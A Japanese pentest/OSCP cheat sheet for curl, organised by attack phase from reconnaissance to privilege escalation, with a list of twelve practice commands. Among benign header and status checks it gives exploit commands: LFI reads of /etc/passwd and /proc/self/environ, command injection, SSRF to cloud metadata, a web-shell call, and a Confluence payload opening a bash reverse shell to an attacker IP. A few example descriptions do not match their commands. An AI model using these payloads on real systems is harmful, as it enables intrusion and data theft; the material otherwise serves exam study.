# curl

## 🎯 概要
**curl**（Client URL）は、HTTP、HTTPS、FTP、SMB、Gopher、Telnetなど、多種多様なプロトコルをサポートする強力なコマンドラインデータ転送ツールです。ペネトレーションテストやOSCPにおいて、curlはブラウザの代わりとなる「Webクライアント」として機能するだけでなく、リクエストのヘッダーやメソッドを細かく制御することで、脆弱性の発見や悪用（エクスプロイト）を行うための必須ツールとなります。

---

## 🛠 代表的な用途
- **技術スタックの特定**: サーバーレスポンスのヘッダーからWebサーバーの種類やOS、使用されているプログラム言語を調査します。
- **機密情報の取得**: ディレクトリトラバーサル（LFI）を利用したシステムファイル（`/etc/passwd`など）や環境変数の読み取りを行います。
- **リモートコード実行（RCE）の悪用**: POSTリクエストを介したコマンドインジェクションの実行や、リバースシェルの確立を試みます。
- **自動化された列挙**: ワードリストを用いたファイル探索や、ステータスコードに基づいた効率的なスキャンをスクリプトで行います。
- **OSCPでの利用ポイント**: ブラウザが使用できない制限されたシェル環境下でのデータ転送や、手動での詳細なリクエスト改ざん、プロキシ経由の通信確認に多用されます。

---

## 🔍 基本コマンド
```bash
# Webサイトのコンテンツを取得して標準出力に表示
curl http://target.local

# レスポンスヘッダーのみを取得（バナーグラビング）
curl -I http://target.local

# 取得したデータを指定したファイル名で保存
curl -o output.html http://target.local

# 301/302リダイレクトを自動的に追跡
curl -L http://target.local

# 詳細な通信内容（リクエスト/レスポンスヘッダー、TLS情報）を表示
curl -v http://target.local
```


---

## 🧪 よく使う攻撃シナリオ
- **ディレクトリトラバーサルによるLFI**: URLパラメータを遡り、ターゲットOSの機密ファイルを読み取ります。
- **POSTメソッドによるコマンドインジェクション**: `Archive`パラメータなどの入力欄を介して、不正なOSコマンドを送信します。
- **User-Agent偽装による検知回避**: 特定のブラウザ（IEなど）を装うことで、サーバー側の制限を回避したり、特定の技術情報を収集したりします。

---

## 📌 フェーズ別コマンド例  

### 🔎 OSINT（外部情報収集）
```bash
# 公開されているツールやスクリプトを認証付きでダウンロード
curl -u osint8:password -O https://example.com/tools.zip

# ターゲットに関連する公開情報ファイルを特定の範囲で一括取得
curl http://example.com/backup.zip -O
```


---

### 🔎 Reconnaissance（技術的偵察）
```bash
# ヘッダー情報を取得し、Webサーバーの種類や構成技術を特定
curl -I http://$IP

# リダイレクトを追跡しつつ、最終的なサーバー情報を取得
curl -LI http://$IP

# ヘッダー情報の取得と同時にUser-Agentを古いWindowsに偽装
curl -I -X HEAD -A "Mozilla/5.0 (Windows NT 5.0)" http://$IP

# Telnetプロトコルを使用してポートの接続性を手動テスト
curl -v telnet://$IP:4444
```


---

### 🧭 Enumeration（外部サービスの詳細調査）
```bash
# シーケンシャル（連番）ファイルを高速にチェック
curl http://example.com/file.txt

# ステータスコード（例: 200, 404）のみを抽出して存在を確認
curl -s -o /dev/null -w '%{http_code}\n' http://$IP/admin/

# ページタイトル（<title>タグ）のみをスクリプトで抽出
for i in `seq 10 40`; do curl -s http://mdsec.net/page?id=$i | grep -Po "<title>(.*)</title>"; done

# Gopherプロトコルを利用して内部サービスへリクエストを偽装（SSRF）
curl gopher://localhost:31337/1payload

# FTPサーバーにディレクトリ一覧のリクエストを送信
curl ftp://user:pass@example.com/directory/
```


---

### 🚪 Initial Access（初期侵入）
```bash
# LFIを悪用してターゲットサーバーのパスワードファイルを読み取る
curl http://$IP/cgi-bin/../../../../etc/passwd

# POSTメソッドを使用してOSコマンド（id）を送信
curl -X POST --data 'Archive=git;id' http://$IP:8000/archive

# Confluenceの脆弱性を利用して複雑なBashリバースシェルを送信
curl http://$IP:8090/%24%7B...ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/$ATTACKER_IP/4444%200%3E%261%27%29.start%28%29%22%29%7D/

# cookieを使用して認証を維持したまま、不正なPHPバックドアを叩く
curl -v --cookie "lang=../upload/shell.png" http://$IP/index.php?cmd=id
```


---

### 📋 Local Enumeration（侵入後のローカル調査）
```bash
# 侵入済みのWebコンテナからクラウドのメタデータ情報を取得
curl http://169.254.169.254/latest/meta-data/local-ipv4

# LFI経由で自身の環境変数（procfs）を読み取り、バイナリ警告を回避して表示
curl -X POST -b "pass=..." -d 'file=../../../../../proc/self/environ' $URL | tr '\0' '\n'

# 内部のWebディレクトリを再帰的に確認
curl http://localhost/site/busque.php --get --data-urlencode "buscar=ls -R /var/www/html"
```


---

### 📈 Privilege Escalation（権限昇格）
```bash
# ローカルファイル読み取り権限を悪用し、Web経由でDBの設定ファイルを読み取る
curl http://localhost/view?file=/var/www/html/config.php

# RCEを利用してシステムのバックアップファイルを現在の公開ディレクトリにコピー
curl http://$IP/api/exec?cmd=cp%20/var/www/html/.backup%20./
```


---

### 🔑 Credential Access（認証情報探索）
```bash
# ログイン後のページを認証情報付きでスクレイピングし、ファイルに保存
curl -u user:pass -o outfile https://login.example.com/admin

# 特殊文字を含むパスワードやコマンドをURLエンコードして安全に送信
curl $URL/busque.php --get --data-urlencode "buscar=cat /var/www/html/.backup"
```


---

### 🚪 Pivot / Port Forward（内部サービスへのアクセス）
```bash
# プロキシ（Burp Suite等）を経由してHTTPリクエストを送信し、通信をデバッグ
curl -x http://127.0.0.1:8080 http://internal.target.local

# 内部ネットワークの特定のポートへの接続性を確認
curl -v telnet://10.0.0.50:3306
```


---

## 🏢 Active Directory（AD）
基本的に関連なし。ただし、WebベースのAD管理ツールやAPIへの接続確認、またはNTLM認証が必要なWebリソースへのアクセスに使用されます。

---

## 🧰 便利オプション一覧
- **`-I`** (`--head`): ヘッダーのみを取得。偵察に最適。
- **`-L`** (`--location`): リダイレクトを自動追跡。301/302応答時に必須。
- **`-u`** (`--user`): ユーザー名とパスワードによる認証。
- **`-A`** (`--user-agent`): カスタムUser-Agentの送信。WAF回避や環境偽装に利用。
- **`-X`** (`--request`): HTTPメソッド（GET, POST, PUT等）を明示的に指定。
- **`-d`** (`--data`): POSTリクエストのデータ送信。SQLiやRCEで多用。
- **`--data-urlencode`**: データをURLエンコードして送信。特殊文字（&, ;, 空白など）を含むペイロードに有効。
- **`-b`** (`--cookie`): 保存されたCookieを送信。セッション維持に必須。
- **`-s`** (`--silent`): 進捗状況を非表示にし、出力結果のみを表示。スクリプト化に最適。
- **`-w`** (`--write-out`): `%{http_code}`などの変数を使い、出力形式をカスタマイズ。
- **`-o` / `-O`**: データをファイルに保存。大文字の`-O`はリモート名を維持。

---

## 🚀 実践例（10個以上）

```bash
# 【実践1】LFIを利用してディレクトリを遡り、OSのパスワードファイルを読み取る
curl http://192.168.50.16/cgi-bin/../../../../etc/passwd

# 【実践2】POSTメソッドでArchiveパラメータにOSコマンド(ipconfig)を注入する
curl -X POST --data 'Archive=git;ipconfig' http://192.168.50.189:8000/archive

# 【実践3】脆弱なConfluenceサーバーに対し、Bashリバースシェルを実行させるペイロードを送信
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

# 【実践4】LFI経由で環境変数を抽出し、見にくいヌル文字を改行に置換して整形表示
curl -X POST -b "pass=SECRET_COOKIE" -d 'file=../../../../../proc/self/environ' http://target/admin.php | tr '\0' '\n'

# 【実践5】クラウド環境のSSRF脆弱性を利用し、インスタンスの内部IPアドレスを取得
curl http://169.254.169.254/latest/meta-data/local-ipv4

# 【実践6】1から100までのファイルを自動的に取得し、Webディレクトリを列挙
curl http://example.com/backup/file.zip -O

# 【実践7】Gopherプロトコルを使い、外部から接続できない内部ポート31337へデータを送信
curl gopher://localhost:31337/1aaa%0d%0abbb%0d%0accc

# 【実践8】Telnetプロトコルを使用し、特定ポートが外部から到達可能か冗長モードで確認
curl -v telnet://192.168.56.123:4444

# 【実践9】Webサイトが生きているか、ステータスコード（200等）のみを出力して確認
curl -s -o /dev/null -w '%{http_code}\n' http://192.168.56.123:80/

# 【実践10】--data-urlencodeを使用し、記号混じりのOSコマンドをURLセーフな形で送信
curl http://$IP/site/busque.php --get --data-urlencode "buscar=ls -la /var/www/html"

# 【実践11】ログインが必要なサイトから、認証情報を用いて特定ページをダウンロード
curl -u admin:password123 -o index_auth.html https://target.com/dashboard

# 【実践12】スクリプトと組み合わせ、特定のID範囲のWebページタイトルを一括取得
for i in $(seq 10 40); do echo -n "ID $i: "; curl -s http://target/view?id=$i | grep -Po "<title>(.*)</title>"; done
```


---

## 🧩 他ツールとの組み合わせ
- **Burp Suite** → ブラウザで作成した複雑なリクエストを「Copy as curl」でコピーし、Terminalでコマンドを使いまわして調査を継続します。
- **Netcat (nc)** → curlでリバースシェル用のペイロードを送信し、Netcat側で接続を待ち受けます。
- **tr / grep / sed** → curlのノイジーな出力を整形し、環境変数やフラグ、ステータスコードのみを抽出します。
- **PHP (urlencode)** → 特殊文字を含む複雑なペイロードを、curlに渡す前にPHPのコマンドラインからURLエンコードします。

---

## 📝 注意点（OSCP 試験での使い方）
- **バイナリ出力の警告**: `/proc/self/environ` などの環境変数を取得する際、Terminalを汚さないよう `--output -` を指定するか、パイプで後続処理に渡す必要があります。
- **URLエンコードの欠落**: ペイロード内の `&` や `+`、空白などが正しく解釈されない場合があるため、`--data-urlencode` オプションを積極的に活用してください。
- **証跡の記録**: 試験レポートには `-v` オプションを用いた詳細な通信ログを含めることで、リクエストの内容とレスポンスを明確に証明できます。

---

## 🔗 参考リンク
- 公式：[curl - How To Use](https://curl.se/docs/manpage.html)
- 公式：[libcurl API](https://curl.se/libcurl/)
- 脆弱性活用：[Pentestmonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
